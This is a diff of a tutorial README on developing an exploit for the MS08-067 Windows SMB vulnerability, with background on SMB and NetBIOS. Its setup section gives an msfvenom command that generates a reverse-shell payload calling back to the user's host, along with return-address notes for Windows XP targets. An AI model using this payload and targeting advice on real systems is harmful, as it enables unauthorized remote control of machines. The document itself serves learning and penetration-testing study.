@@ -1,23 +1,23 @@
 # Getting the exploit working
 
-This exploit is primarily written as a learning tool alongside the derivation guide below, it is intended as a documentation of my exploit development process as well as a brief literature review of the various components associated with the ms08_067 vulnerability, such as SMB, DCE/RPC, and named pipes. However, if you must break things with the code, ensure that you first have permission to test the target, and that you test the exploit in your own environment beforehand. 
+This exploit is primarily written as a learning tool alongside the derivation guide below, it is intended as a documentation of my exploit development process, as well as a brief literature review of the various components associated with the ms08_067 vulnerability, such as SMB, DCE/RPC, and named pipes. However, if you must use the exploit code, ensure that you first have permission to test the target, and be sure to test the exploit in your own environment beforehand. 
 
-The return addresses within the exploit should work perfectly for Windows XP SP 0 and 1 as is, any other targets will require a different return address and potentially some DEP and ASLR by-pass, see the source code of the ms08_067_netapi module in metasploit for more information. 
+The shell code return addresses within the exploit should work perfectly for Windows XP SP 0 and 1 as is, any other targets will require a different return address, and potentially some DEP and ASLR by-pass. See the source code of the ms08_067_netapi module in metasploit for more information. 
 
-Also, no matter the target, you will have to replace the payload with your own shellcode (to include source/target ip addresses etc), this can be done simply by running the msfvenom command:
+No matter the target, you will have to replace the payload with your own shellcode (to include source/target ip addresses etc), this can be done simply by running the msfvenom command:
 ```bash
 msfvenom --payload windows/shell_reverse_tcp --nopsled 7 LHOST=<your.ip.address.here> EXITFUNC=thread --bad-chars "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -e x86/jmp_call_additive
 ```
-and copying the output into the exploit code.
+and copying the output into the exploit code at the marked location.
 
 
-# Intro
+# Introduction
 
-The hacker ethos at its' core for me, just like any scientist, is an unbounded enthusiasm for understanding and communicating how things work. In lieu of this, I'll do my best to communicate what I've discovered, as well as how I discovered it, and indicate at each point where I've got my information from. I think that contributing the best way to feel legitimately involved in a community. So here it is, my first contribution, a walkthrough of the MS08_067 vulnerability, culminating with putting the exploit together myself in python.
+The hacker ethos at its' core for me, just like any scientist, is an unbounded enthusiasm for understanding and communicating how things work. I believe that contributing is the best way to feel legitimately involved in a community. With that in mind, my first little contribution, a beginners' walkthrough of the MS08_067 vulnerability, culminating with the step-by-step development of a working exploit in Python.
 
-Let's start with the fact that MS08_067 is a bug, and it was given this rather bland codename because it was the 67th bugfix in 2008 by Microsoft. It was a particularly devastating bug, because prior to the update all a variety of Windows versions were exploitable at factory settings, without any credentials whatsoever, and completely automatable. So I recognise that at almost a decade old this is an ancient vulnerability, but during my time as a penetration tester in 2016/2017 I have discovered a fair number of machines *still* vulnerable to this.
+Let's start with the fact that MS08_067 is a bug, and it was given this rather bland codename because it was the 67th bugfix in 2008 by Microsoft. It was a particularly devastating bug, because prior to the update all a variety of Windows versions were exploitable at factory settings, without any credentials whatsoever, and it was completely automatable. I recognise that at almost a decade old, this is an ancient vulnerability, but during my time working as a penetration tester, even in 2016/2017, I have discovered a fair number of machines that are *still* vulnerable to this.
 
-So how does it work? let's start with the short explanation given with the bug on Rapid7 Vulndb:
+So, how does it work? Let's start with the short explanation given with the bug on Rapid7 Vulnerability database [0]:
 > This module exploits a parsing flaw in the path canonicalization code of NetAPI32.dll through the Server Service. This module is capable of bypassing NX on 
 > some operating systems and service packs. The correct target must be used to prevent the Server Service (along with a dozen others in the same process) from 
 > crashing. Windows XP targets seem to handle multiple successful exploitation events, but 2003 targets will often crash or hang on subsequent attempts. This 
@@ -35,9 +35,11 @@ This gives us relatively few clues as to the actual mechanism of the vulnerabili
 	1. shellcode can be anything, I used a reverse shell generated by metasploit.
 1. shellcode executes, pwn.
 
+[0] https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi
+
 # SMB and NetBIOS, and negotiating our initial connection
 
-God knows why this took so long to pick apart, they are almost always mentioned in the same sentence, the familiar sentence is “TCP port 445 and 139 are SMB/NetBIOS” and as far as I can tell that is because they are almost indistinguishable smooshed together practically. However, as protocols, they are completely different things. In short NetBIOS is essentially a communication API, providing NetBIOS names among other things, but it is used by the SMB protocol on port TCP 139 to share computer resources, like printers and disk space. This makes SMB the microsoft implementation of a CIFS, and due to its' importance, Microsoft decided to give it its' own port, SMB over TCP/IP, port 445. Let's make this concrete by talking about them separately.
+God knows why this took so long to pick apart, they are almost always mentioned in the same sentence, the familiar sentence is “TCP port 445 and 139 are SMB/NetBIOS” and as far as I can tell that is because they are almost indistinguishable smooshed together practically. However, as protocols, they are completely different things. In short NetBIOS is essentially a communication API, providing NetBIOS names among other things, but it is used by the SMB protocol on port TCP 139 to share computer resources, like printers and disk space. This makes SMB the Microsoft implementation of a CIFS, and due to its' importance, Microsoft decided to give it its' own port, SMB over TCP/IP, port 445. Let's make this concrete by talking about them separately.
 
 ## NetBIOS
 
